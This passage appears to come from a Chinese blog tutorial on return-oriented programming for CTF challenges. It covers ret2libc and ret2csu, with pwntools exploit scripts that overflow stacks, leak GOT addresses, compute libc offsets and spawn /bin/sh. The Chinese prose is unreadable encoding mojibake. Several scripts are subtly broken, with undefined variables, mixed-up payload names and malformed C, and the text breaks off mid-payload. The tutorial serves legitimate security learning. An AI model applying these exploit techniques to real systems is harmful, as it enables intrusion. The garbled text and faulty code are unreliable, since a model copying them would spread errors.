‡æ±‡ç¼–ä»£ç ç‰‡æ®µï¼ŒROPgadgeté€Ÿåº¦æ›´å¿«ä½†æ˜¯æŸ¥æ‰¾ç»“æœå¹¶ä¸å®Œæ•´ï¼›ropperé€Ÿåº¦ç›¸å¯¹è¾ƒæ…¢ä½†æŸ¥æ‰¾ç»“æœç²¾å‡†ã€‚</p><p>å¯¹äºé™æ€ç”Ÿæˆçš„ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨æ¯ä¸€æ¬¡éƒ½ä¸€æ¡ä¸€æ¡çš„å»æ‰¾å‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆä¸€æ¡ROPé“¾</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">ropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execverropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execve</span><br><span class="hljs-comment">ROPgadget</span> <span class="hljs-literal">--</span><span class="hljs-comment">binary inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">ropchain</span><br></code></pre></td></tr></table></figure><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>ret2libcå³æ§åˆ¶å‡½æ•°æ‰§è¡Œlibcä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›å€¼æŸä¸ªå‡½æ•°çš„pltå¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½®ï¼ˆå³å‡½æ•°å¯¹åº”çš„gotè¡¨é¡¹çš„å†…å®¹ï¼‰ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚</p><h4 id="ğŸŒ°-1-2"><a href="#ğŸŒ°-1-2" class="headerlink" title="ğŸŒ°_1:"></a>ğŸŒ°_1:</h4><p>CTF Wiki çš„é¢˜ï¼Œè¶…ç®€å•çš„æ‰€æœ‰ä¿¡æ¯éƒ½ç»™å‡ºçš„æ–°æ‰‹é¢˜ç›® <del>æˆ‘éƒ½ä¼šåš</del></p><p>é¦–å…ˆæŸ¥çœ‹å®‰å…¨ä¿æŠ¤</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-39-30.png"></p><p>æºç¨‹åºä¸º 32 ä½ï¼Œå¼€å¯äº† NX ä¿æŠ¤ã€‚çœ‹ä¸€ä¸‹ç¨‹åºæºä»£ç ï¼Œç¡®å®šæ ˆæº¢å‡ºåˆ©ç”¨ä½ç½®</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-42-44.png"></p><p>getså¯ä»¥æ ˆæº¢å‡ºã€‚</p><p>æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°systemå‡½æ•°å’Œâ€™bin&#x2F;shâ€™å­—ç¬¦ä¸²</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-46-14.png"></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-48-21.png"></p><p>æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è¿”å› system çš„åœ°å€</p><p>è®¡ç®—åç§»é‡ä¸º112ï¼Œæ„é€ payloadã€‚éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬è°ƒç”¨systemå‡½æ•°ï¼Œä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„å››å­—èŠ‚çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶å¡«å……åå†é™„ä¸Šæˆ‘ä»¬çš„ â€˜&#x2F;bin&#x2F;shâ€™ å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process( <span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/Cm8v0D/ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br><br>payload=flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh_addr])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="ğŸŒ°-2-2"><a href="#ğŸŒ°-2-2" class="headerlink" title="ğŸŒ°_2:"></a>ğŸŒ°_2:</h4><p>åŒæ ·æ˜¯32ä½çš„ç¨‹åºå¼€å¯NXä¿æŠ¤ï¼Œæœ‰ä¸€ä¸ªgetså¯ä»¥åˆ©ç”¨ã€‚æœ‰systemå‡½æ•°ä½†æ²¡æœ‰ â€˜&#x2F;bin&#x2F;shâ€™ å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªgets()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±è¯»å–ã€‚åŒæ—¶æˆ‘ä»¬åœ¨.bssæ®µå‘ç°ä¸€ä¸ªbufå¯ä»¥ä¼ å‚ï¼Œå¯ä»¥æŠŠå­—ç¬¦ä¸²å¡«åœ¨è¿™é‡Œ</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-44-44.png"></p><p>ç¼–å†™expï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>r=process(&#x27;/var/run/vmblock-fuse/blockdir/wD0Lp7/ret2libc2&#x27;)<br><br>buf_addr = 0x804A080<br>gets_addr = 0x8048460<br>sys_addr = 0x8048490<br><br>payload = flat( [&#x27;A&#x27;*112, gets_addr, sys_addr, buf_addr, buf_addr] )<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>payloadè§£é‡Šï¼š</p><ul><li><code>&#39;A&#39;*112</code>ï¼šå¡«å……112ä¸ªå­—ç¬¦â€™Aâ€™æº¢å‡ºç¼“å†²åŒºï¼Œè¦†ç›–è¿”å›åœ°å€ã€‚</li><li><code>gets_addr</code>ï¼šå°†<code>gets</code>å‡½æ•°çš„åœ°å€ä½œä¸ºåŸæœ¬ç¨‹åºçš„gets()å‡½æ•°çš„è¿”å›åœ°å€ï¼Œæ§åˆ¶ç¨‹åºæµç¨‹è·³è½¬åˆ°<code>gets</code>å‡½æ•°ã€‚</li><li><code>sys_addr</code>ï¼š<code>system</code>å‡½æ•°çš„åœ°å€ï¼Œå°†ä½œä¸º<code>gets</code>å‡½æ•°è¿”å›åçš„ä¸‹ä¸€ä¸ªåœ°å€ï¼Œæ§åˆ¶ç¨‹åºæµç¨‹è·³è½¬åˆ°<code>system</code>å‡½æ•°ã€‚</li><li><code>buf_addr</code>ï¼šç¼“å†²åŒºçš„åœ°å€ï¼Œä½œä¸º<code>system</code>å‡½æ•°çš„å‚æ•°ï¼Œä¼ é€’ç»™<code>system</code>å‡½æ•°çš„å‘½ä»¤å­—ç¬¦ä¸²æ‰€åœ¨çš„å†…å­˜åœ°å€ã€‚</li><li><code>buf_addr</code>ï¼šå†æ¬¡ä½¿ç”¨ç¼“å†²åŒºçš„åœ°å€ï¼Œä½œä¸º<code>gets</code>å‡½æ•°çš„å‚æ•°ï¼Œä½¿å¾—<code>gets</code>å‡½æ•°å°†ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤å­—ç¬¦ä¸²å†™å…¥åˆ°ç¼“å†²åŒºã€‚</li></ul><h4 id="ğŸŒ°-3"><a href="#ğŸŒ°-3" class="headerlink" title="ğŸŒ°_3:"></a>ğŸŒ°_3:</h4><p>è¿™æ¬¡systemä¹Ÿæ²¡äº†ğŸ¤¨ï¼Œå…¶ä»–çš„ä¿æŠ¤å’Œæ¼æ´éƒ½å’Œä¾‹ä¸€ä¾‹äºŒä¸€æ ·ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œé¢˜ç›®ä¸­åˆç»™äº†ä¸€ä¸ª libc.so åŠ¨æ€é“¾æ¥åº“ã€‚</p><p>é‚£æ€ä¹ˆå¾—åˆ°systemçš„åœ°å€å‘¢ï¼Ÿ</p><p>è¡¥è¯¾æ—¶é—´åˆ°ï¼</p><ul><li>system å‡½æ•°å±äº libcï¼Œè€Œ libc.so åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚</li><li>å³ä½¿ç¨‹åºæœ‰ ASLR ä¿æŠ¤ï¼Œä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„ 12 ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚è€Œ libc åœ¨ github ä¸Šæœ‰äººè¿›è¡Œæ”¶é›†ï¼Œ<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬è¿˜è¦çŸ¥é“ï¼ŒA çœŸå®åœ°å€ (å†…å­˜ç‰©ç†åœ°å€) - A åç§»åœ°å€ &#x3D; B çœŸå®åœ°å€ (å†…å­˜ç‰©ç†åœ°å€) -B åç§»åœ°å€ &#x3D; åŸºåœ°å€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>Bçš„çœŸå®åœ°å€&#x3D;åŸºåœ°å€+Bçš„åç§»åœ°å€</strong>ã€‚</p><p><strong>æ‰€ä»¥å¦‚æœæˆ‘ä»¬çŸ¥é“ libc ä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šè¯¥ç¨‹åºåˆ©ç”¨çš„ libcã€‚è¿›è€Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚</strong></p><p>é‚£è¯¥å¦‚ä½•è·å¾—å·²çŸ¥å‡½æ•°çš„åœ°å€å‘¢ï¼Ÿ</p><p>gotè¡¨æ³„éœ²ï¼è¾“å‡ºæŸä¸ªå‡½æ•°å¯¹åº”çš„gotè¡¨å†…å®¹ï¼Œæ³¨æ„libcçš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œgotè¡¨ä¸­åªæœ‰å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°æœ‰çœŸå®åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°åœ°å€ã€‚å†åœ¨ç¨‹åºä¸­æŸ¥è¯¢åç§»è¿›ä¸€æ­¥è·å¾—systemåœ°å€ã€‚</p><p>ä½†æ˜¯ï¼è¿™æ ·å¤ªéº»çƒ¦å•¦æˆ‘ä»¬å¯ä»¥ç”¨å·¥å…·ï¼š<a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a> </p><p>expï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>sh = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>got_puts = elf.got[&#x27;puts&#x27;]<br>got_libc_startmain = elf.got[&#x27;__libc_start_main&#x27;]<br>main = elf.symbols[&#x27;main&#x27;]<br><br>payload1 = flat( [b&#x27;A&#x27;*112, puts_plt, main, got_puts] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload1)<br>puts_addr = u32(sh.recv(4))<br><br><span class="hljs-comment"># libc6_2.27-3ubuntu1.2_i386</span><br>libc_puts = 0x67c10 <span class="hljs-comment">#offset</span><br>libc_system = 0x3d250<br>libc_binsh = 0x17e3cf<br><br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br>binsh_addr = libc_base + libc_binsh<br><br>payload2 = flat( [b&#x27;A&#x27;*112, system_addr, 0xcafebabe, binsh_addr] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload2)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>äº†è§£ret2csuä¹‹å‰å…ˆäº†è§£ä¸€ä¸‹attached codeçš„æ¦‚å¿µã€‚</p><p>æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªç®€å•çš„åªæœ‰ä¸€ä¸ªmainå‡½æ•°çš„ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">include&lt;stdio.h&gt;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(jint argc,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶çš„å‡½æ•°ç¬¦å·ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nm</span> -<span class="hljs-keyword">a</span> [filename] | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;t\|T&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-37-10.png"></p><p>å¯ä»¥å‘ç°é™¤äº† main å‡½æ•°è¿˜æœ‰å¾ˆå¤šå…¶å®ƒå‡½æ•°ï¼Œè¿™äº›å‡½æ•°æ˜¯ç¼–è¯‘å™¨é™„åŠ åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ï¼Œç§°ä¹‹ä¸º attached code ã€‚è¿™äº› attached code åœ¨main å‡½æ•°ä¹‹å‰æ‰§è¡Œï¼Œè´Ÿè´£åŠ è½½æˆ–è€…é“¾æ¥åº“æ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ä» attached code ä¸­å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ gadgetsã€‚</p><p>æˆ‘ä»¬åˆ©ç”¨ <code>objdum -D [filename] </code>å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶åæ±‡ç¼–ä»£ç å¯ä»¥çœ‹åˆ° <code>__libc_csu_init()</code> å‡½æ•°ä¸­å­˜åœ¨ä»¥ä¸‹gadgetï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-50-34.png"></p><p>åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰ 6 ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œå‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨: rdi, rsi, rdx, rcx, r8, r9ã€‚ä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„ gadgetsã€‚ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>__libc_csu_init</code> ä¸­çš„ gadgetsã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ‰§è¡Œå®Œç¬¬äºŒä¸ªgadgetåretåˆ°ç¬¬ä¸€ä¸ªgadgetï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶å¾ˆå¤šå…³é”®å¯„å­˜å™¨çš„å€¼ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•ä¸èƒ½æ§åˆ¶raxçš„å€¼ï¼Œä¹Ÿå°±æ— æ³•è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œå› ä¸ºç³»ç»Ÿè°ƒç”¨å·åœ¨raxé‡Œã€‚ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡writeç­‰å‡½æ•°æ³„éœ²gotè¡¨ä¸­çš„å‡½æ•°åœ°å€ï¼Œç„¶åè®¡ç®—å‡ºlibcåœ°å€ã€‚</p><p>æœ‰ä»¥ä¸‹å‡ ç§åˆ©ç”¨åœºæ™¯ï¼š</p><ul><li>ret2csuæ³„éœ²libcåœ°å€ååˆ©ç”¨libcä¸­çš„gadget</li><li>ret2csué…åˆpop rax;syscall;ç­‰gadgetç›´æ¥getshell</li><li>å¼€å¯pieçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨offset2libè¿›è¡Œret2csu,æˆ–è€…ç›´æ¥åˆ©ç”¨libcä¸­çš„gadget getshell</li></ul><blockquote><p>offset2libç®€å•æ¥è¯´å°±æ˜¯æ³„éœ²ä»»æ„ä»£ç æ®µåœ°å€å³å¯æ¨å¾—æ‰€æœ‰å…±äº«åº“åœ°å€,å› ä¸ºå…±äº«åº“ä¹‹é—´çš„offsetæ˜¯å›ºå®šçš„.</p></blockquote><h4 id="ğŸŒ°-1-3"><a href="#ğŸŒ°-1-3" class="headerlink" title="ğŸŒ°_1:"></a>ğŸŒ°_1:</h4><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5%E3%80%82">https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5ã€‚</a></p><p>é¢˜ç›®æ²¡æœ‰å¼€å¯pieå’Œcanaryä¿æŠ¤ã€‚</p><p>è’¸ç±³å¸ˆå‚…ç»™äº†æºç ï¼Œæˆ‘ä»¬è‡ªå·±æ‹–åˆ° ida é‡Œä¹Ÿèƒ½åˆ¤æ–­å‡ºä»£ç çš„åŸºæœ¬é€»è¾‘ï¼Œmain() å‡½æ•°é‡Œè¿˜æœ‰ä¸€ä¸ª <code>vulnerable_function()</code> å‡½æ•° ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];<br>read(STDIN_FILENO, buf, <span class="hljs-number">512</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>write(STDOUT_FILENO, <span class="hljs-string">&quot;Hello, World/n&quot;</span>, <span class="hljs-number">13</span>);<br>vulnerable_function();<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨readå¤„æœ‰æ˜æ˜¾çš„æ ˆæº¢å‡ºå¯ä»¥åˆ©ç”¨ã€‚<code>.plt</code> è¡¨é‡Œå°±åªæœ‰writeå‡½æ•°å’Œreadå‡½æ•°ã€‚</p><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯è°ƒç”¨ <code>system(&quot;/bin/sh&quot;)</code> ï¼Œå¯ä»¥å…ˆæ³„éœ²å‡ºlibcå‡½æ•°çš„åœ°å€ï¼Œç”¨writeæ‰“å°å‡ºæ¥ï¼Œé€šè¿‡è®¡ç®—åç§»å°±å¯ä»¥æ±‚å‡ºsystemå‡½æ•°çš„åœ°å€ã€‚ç„¶åä½¿ç”¨readå‡½æ•°å°†çœŸå®çš„systemå‡½æ•°åœ°å€å’Œ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²å†™å…¥bssæ®µï¼Œæœ€åè°ƒç”¨systemå‡½æ•°å³å¯ã€‚</p><p>æˆ‘ä»¬çŸ¥é“åœ¨64ä½çš„ç¨‹åºä¸­ï¼Œå‰å…­ä¸ªå‚æ•°ä½¿ç”¨å¯„å­˜å™¨RDI, RSI, RDX, RCX, R8å’Œ R9ä¼ é€’</p><p>åœ¨__libc_csu_init()å‡½æ•°ä¸­æœ‰å¯ä»¥åˆ©ç”¨çš„gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-19_10-16-23.png"></p><p>æˆ‘ä»¬æ§åˆ¶rbx,rbp,r12,r13,r14å’Œr15çš„å€¼ï¼Œå†å°†r15çš„å€¼èµ‹å€¼ç»™rdxï¼Œr14çš„å€¼èµ‹å€¼ç»™rsiï¼Œr15çš„å€¼èµ‹å€¼ç»™ediã€‚ç®€å•æ¥è¯´å¯¹åº”å…³ç³»å°±æ˜¯:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rdi</span>=  <span class="hljs-built_in">edi</span> = <span class="hljs-built_in">r13</span>,  <span class="hljs-built_in">rsi</span> = <span class="hljs-built_in">r14</span>, <span class="hljs-built_in">rdx</span> = <span class="hljs-built_in">r15</span><br></code></pre></td></tr></table></figure><p>éšåå°±ä¼šè°ƒç”¨ <code>call qword ptr [r12+rbx*8]</code> ã€‚è¿™æ¡æŒ‡ä»¤çš„å«ä¹‰æ˜¯å‘ <code>[r12+rbx*8]</code> é—´æ¥å¯»å€ï¼Œè·³è½¬åˆ°æ‰€æŒ‡çš„å‡½æ•°åœ°å€ã€‚æˆ‘ä»¬å°±å¯ä»¥å°†rbxèµ‹å€¼ä¸º0ï¼Œè¿™æ ·çš„å¯»å€ç»“æœå°±æ˜¯r12æ‰€æŒ‡å‘çš„åœ°å€ã€‚</p><p>æ¥ä¸‹æ¥çš„æ±‡ç¼–ä»£ç ç‰‡æ®µå«ä¹‰ä¸ºï¼šæ‰§è¡ŒcallæŒ‡ä»¤ç»“æŸåï¼Œç¨‹åºå¯¹rbxåŠ ä¸€ï¼Œç„¶åå¯¹æ¯”rbxå’Œrbpçš„å€¼ï¼Œå¦‚æœç›¸ç­‰å°±ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚ä¸ºäº†è®©rbxå’Œrbpç›¸ç­‰ï¼Œæˆ‘ä»¬éœ€è¦å°†rbpèµ‹å€¼ä¸º1ã€‚</p><ul><li>payload-1</li></ul><p>åˆ©ç”¨ <code>read()</code> è¯»å…¥æˆ‘ä»¬çš„payloadï¼Œ<code>write()</code> è¾“å‡ºå…¶gotè¡¨ä¸­çš„åœ°å€ã€‚é™¤äº†æ³„éœ²åœ°å€ï¼Œä¸ºäº†è¿”å›åˆ°åŸç¨‹åºä¸­é‡å¤åˆ©ç”¨ <code>buffer overflow</code> çš„æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦ç»§ç»­è¦†ç›–æ ˆä¸Šçš„æ•°æ®ï¼Œç›´åˆ°æŠŠè¿”å›å€¼è¦†ç›–æˆç›®æ ‡å‡½æ•°çš„mainå‡½æ•°ä¸ºæ­¢ã€‚</p><p>æ€»ç»“ä¸€ä¸‹æˆ‘ä»¬è¦å®ç°çš„payloadéœ€æ±‚ï¼š<code>rbx=0,rbp=1,r12=write_address,rdi=edi=r13,rsi=r14,rdx=r15</code>ï¼Œ<code>write(1,write_got,8)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">csu_end</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400606</span><br><span class="hljs-variable">csu_front</span> = <span class="hljs-number">0</span><span class="hljs-variable">x4005F0</span><br><span class="hljs-variable">got_write</span> = <span class="hljs-variable">level5.got</span>[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-variable">main_address</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400564</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>write(1,write_got,8) çš„å«ä¹‰ä¸ºå°† writ å‡½æ•°çš„åœ°å€å†™å…¥æ ‡å‡†è¾“å‡ºæµä¸­ï¼Œå†™å…¥çš„å­—èŠ‚æ•°ä¸º 8</p></blockquote><p>åœ¨æ”¶åˆ°write()åœ¨å†…å­˜ä¸­çš„åœ°å€åï¼Œå°±å¯ä»¥è®¡ç®—å‡ºsystem()åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚å€Ÿæ­¤å°±å¯ä»¥å°†execveçš„åœ°å€ä»¥åŠâ€œ&#x2F;bin&#x2F;shâ€è¯»å…¥åˆ°.bssæ®µå†…å­˜ä¸­ã€‚</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">bin_sh_str</span> = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br><span class="hljs-variable">bss_addr</span> = <span class="hljs-number">0</span><span class="hljs-variable">x601040</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span 